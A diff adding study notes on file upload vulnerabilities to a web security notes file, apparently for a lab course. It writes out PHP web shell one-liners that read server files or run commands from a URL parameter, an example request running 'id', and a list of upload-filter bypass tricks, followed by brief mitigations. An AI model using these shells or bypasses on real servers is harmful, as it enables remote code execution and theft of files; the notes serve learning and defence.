@@ -884,7 +884,40 @@
   Missing referer > get unauthorized error > paste back the referrer > OK   
 
 ## File Upload
-Content for File Upload...
+**Example of remote code**   
+- Executable file type: web shell, php, java
+- Response header: Content-Type
+- `<?php echo file_get_contents('/path/to/target/file'); ?>`
+- `<?php echo system($_GET['command']); ?>`
+   GET /example/exploit.php?command=**id** HTTP/1.1
+
+**Flawed validation of file uploads**
+- Content-Disposition: form-data; name="image"; filename="example.jpg"   
+  **Content-Type**: image/jpeg   
+- Content-Disposition: form-data; name="description"   
+  Content-Type: multipart/form-data;   
+- Server execute any scripts that do slip through the net   
+- Obfuscating file extensions. Using lesser known, alternative file extensions such as .php5, .shtml
+  - casing different: `.pHp` vs .php
+  - Provide multiple extensions: `exploit.php.jpg`
+  - Add trailing characters: `exploit.php.`
+  - URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes: `exploit%2Ephp`
+  - Add semicolons or URL-encoded null byte characters before the file extension: `exploit.asp;.jpg` `exploit.asp;.jpg`
+  - multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion: `xC0 x2E` `xC4 xAE`
+- Overriding the server configuration
+  /etc/apache2/apache2.conf `AddType application/x-httpd-php .php`   
+  IIS/web.config `<mimeMap fileExtension=".json" mimeType="application/json" />`
+- bypass stripping or replacing dangerous extensions to prevent the file from being execute: `exploit.p.phphp`
+- file upload race condition
+- Upload malicious client-side scripts `<scrip>`
+- support `PUT` requests
+
+**Mitigation**
+- heck the file extension against a whitelist
+- Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence ../
+- Rename uploaded files to avoid collisions that may cause existing files to be overwritten
+- Do not upload files to the server's permanent filesystem until they have been fully validated
+- use an established framework for preprocessing file uploads      
 
 ### File Upload Lab
 
